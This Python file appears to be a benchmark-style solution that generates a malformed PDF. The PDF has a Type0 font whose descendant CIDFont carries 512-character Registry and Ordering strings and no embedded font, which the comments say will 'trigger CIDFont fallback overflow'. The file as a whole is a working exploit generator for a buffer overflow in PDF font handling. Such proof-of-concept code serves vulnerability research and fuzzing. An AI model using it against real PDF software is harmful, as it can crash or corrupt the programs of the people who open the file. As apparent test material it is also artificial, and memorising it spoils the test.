import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct long Registry and Ordering strings to trigger CIDFont fallback overflow
        registry = "A" * 512
        ordering = "B" * 512

        # PDF header
        result = bytearray()
        def w(s: str):
            result.extend(s.encode("ascii"))

        w("%PDF-1.4\n")

        objects = []

        # 1: Catalog
        obj1 = "<< /Type /Catalog /Pages 2 0 R >>\n"
        objects.append(obj1)

        # 2: Pages
        obj2 = "<< /Type /Pages /Count 1 /Kids [3 0 R] >>\n"
        objects.append(obj2)

        # 3: Page
        obj3 = (
            "<< /Type /Page /Parent 2 0 R "
            "/MediaBox [0 0 612 792] "
            "/Resources << /Font << /F1 4 0 R >> >> "
            "/Contents 5 0 R >>\n"
        )
        objects.append(obj3)

        # 4: Type0 Font referencing descendant CIDFont
        obj4 = (
            "<< /Type /Font /Subtype /Type0 "
            "/BaseFont /MYCID "
            "/Encoding /Identity-H "
            "/DescendantFonts [6 0 R] >>\n"
        )
        objects.append(obj4)

        # 5: Content stream
        stream_data = b"BT /F1 12 Tf 72 712 Td <0001> Tj ET\n"
        obj5 = (
            f"<< /Length {len(stream_data)} >>\n"
            "stream\n"
            + stream_data.decode("ascii") +
            "endstream\n"
        )
        objects.append(obj5)

        # 6: CIDFont with oversized CIDSystemInfo strings
        cid_system_info = (
            "/CIDSystemInfo "
            f"<< /Registry ({registry}) "
            f"/Ordering ({ordering}) "
            "/Supplement 0 >>"
        )
        obj6 = (
            "<< /Type /Font /Subtype /CIDFontType2 "
            "/BaseFont /MYCID "
            f"{cid_system_info} "
            "/DW 1000 "
            "/CIDToGIDMap /Identity "
            "/FontDescriptor 7 0 R >>\n"
        )
        objects.append(obj6)

        # 7: FontDescriptor without embedded font, to force fallback
        obj7 = (
            "<< /Type /FontDescriptor "
            "/FontName /MYCID "
            "/Flags 4 "
            "/FontBBox [0 0 0 0] "
            "/ItalicAngle 0 "
            "/Ascent 0 "
            "/Descent 0 "
            "/CapHeight 0 "
            "/StemV 0 >>\n"
        )
        objects.append(obj7)

        # Build body and collect offsets
        offsets = [0]  # object 0 is the free object
        for obj_num, obj in enumerate(objects, start=1):
            offsets.append(len(result))
            w(f"{obj_num} 0 obj\n")
            w(obj)
            if not obj.endswith("\n"):
                w("\n")
            w("endobj\n")

        # xref table
        xref_offset = len(result)
        w("xref\n")
        w(f"0 {len(offsets)}\n")
        w("0000000000 65535 f \n")
        for i in range(1, len(offsets)):
            w(f"{offsets[i]:010d} 00000 n \n")

        # trailer
        w("trailer\n")
        w("<<\n")
        w(f"/Size {len(offsets)}\n")
        w("/Root 1 0 R\n")
        w(">>\n")
        w("startxref\n")
        w(f"{xref_offset}\n")
        w("%%EOF\n")

        return bytes(result)
